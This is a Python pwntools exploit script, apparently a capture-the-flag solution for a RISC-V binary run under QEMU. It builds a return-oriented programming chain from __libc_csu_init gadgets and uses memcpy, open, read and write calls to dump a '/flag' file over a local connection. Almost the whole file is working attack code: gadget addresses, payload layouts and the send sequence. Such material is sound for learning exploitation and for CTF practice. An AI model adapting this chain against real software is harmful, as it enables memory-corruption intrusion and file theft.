#!/usr/bin/env python3

from pwn import *

ROOT = os.path.abspath(os.path.dirname(__file__))
QEMU = os.path.join(ROOT, "../deploy/qemu-riscv64")

if "REMOTE" in os.environ:
    if not "PORT" in os.environ:
        print("[!] Please specify the port number")
        exit(1)
    p = remote("localhost", int(os.environ["PORT"]))
else:
    b = os.path.abspath(os.path.join(ROOT, "../deploy/target"))

    # to increase the stack space
    ENV = "env -i PATH=/bin:/usr/bin:/usr/local/bin"

    args = ""
    if "GDB" in os.environ:
        args = "-g 9000"
    elif "STRACE" in os.environ:
        args = "-strace"

    p = process("%s %s %s ./target" % (ENV, QEMU, args),
                cwd=os.path.dirname(b), shell=True)

   # 43794:       70e2                    ld      ra,56(sp)
   # 43796:       7442                    ld      s0,48(sp)
   # 43798:       6522                    ld      a0,8(sp)
   # 4379a:       74a2                    ld      s1,40(sp)
   # 4379c:       7902                    ld      s2,32(sp)
   # 4379e:       69e2                    ld      s3,24(sp)
   # 437a0:       6121                    addi    sp,sp,64
   # 437a2:       8082                    ret

   # 10a56                                ld      a5,0(s0)
   # 10a58:       8652                    mv      a2,s4
   # 10a5a:       85ce                    mv      a1,s3
   # 10a5c:       854a                    mv      a0,s2
   # 10a5e:       0485                    addi    s1,s1,1
   # 10a60:       9782                    jalr    a5
   # 10a62:       0421                    addi    s0,s0,8
   # 10a64:       fe9a99e3                bne     s5,s1,10a56 <__libc_csu_init+0x6c>
   # 10a68:       70e2                    ld      ra,56(sp)
   # 10a6a:       7442                    ld      s0,48(sp)
   # 10a6c:       74a2                    ld      s1,40(sp)
   # 10a6e:       7902                    ld      s2,32(sp)
   # 10a70:       69e2                    ld      s3,24(sp)
   # 10a72:       6a42                    ld      s4,16(sp)
   # 10a74:       6aa2                    ld      s5,8(sp)
   # 10a76:       6121                    addi    sp,sp,64
   # 10a78:       8082                    ret

def call1(fn, arg1):
    out = [p64(0xdeadeef)]*8
    out[56/8] = p64(fn)
    out[8/8] = p64(arg1)
    return "".join(out)

# payload  = cyclic(40)
# payload += p64(0x43794)
# payload += call1(0x14f34, 399377)

# p.sendline(payload)
# p.interactive()

global BUF
BUF = 0x4000800ce0

GETUID = 0x3b8a8
PRINTF = 0x14f34
MEMCPY = 0x24ffc
OPEN = 0x2602c
READ = 0x260da
WRITE = 0x26156

def call3(fn, arg1, arg2=2, arg3=3):
    global BUF
    payload  = p64(fn)              # *dest
    payload += p64(0x10434)*4       # *start

    payload += p64(0x10a68)
    payload += p64(0xdeadbee0)      #  0(sp)
    payload += p64(0xdeadbee6)      #  8(sp)
    payload += p64(arg3)            # 16(sp)/a2
    payload += p64(arg2)            # 24(sp)/a1
    payload += p64(arg1)            # 32(sp)/a0
    payload += p64(0xdeadbee5)      # 40(sp)
    payload += p64(BUF)             # 48(sp)/s0
    payload += p64(0x10a56)         # ret

    payload += p64(0xdeadbee0)      #  0(sp)
    payload += p64(0xdeadbee6)      #  8(sp)
    payload += p64(0xdeadbee2)      # 16(sp)/a2
    payload += p64(0xdeadbee3)      # 24(sp)/a1
    payload += p64(399377)          # 32(sp)/a0
    payload += p64(0xdeadbee5)      # 40(sp)
    payload += p64(BUF+0x10)        # 48(sp)/s0
    payload += p64(0x10a56)         # ret

    BUF += 0x80

    return payload

def x(fn, arg1, arg2=2, arg3=3):
    payload = call3(fn, arg1, arg2, arg3)
    print(p.recvuntil(b"Password:").decode("utf8"))
    p.sendline(payload)

# copy /flag
x(MEMCPY, 0x0006e6a0, 319224, 1)
x(MEMCPY, 0x0006e6a0+1, 313958, 4)

x(OPEN, 0x0006e6a0, 0)
x(READ, 3, 0x000000000006cb28, 100)
x(WRITE, 1, 0x000000000006cb28, 100)

print(p.recvall())
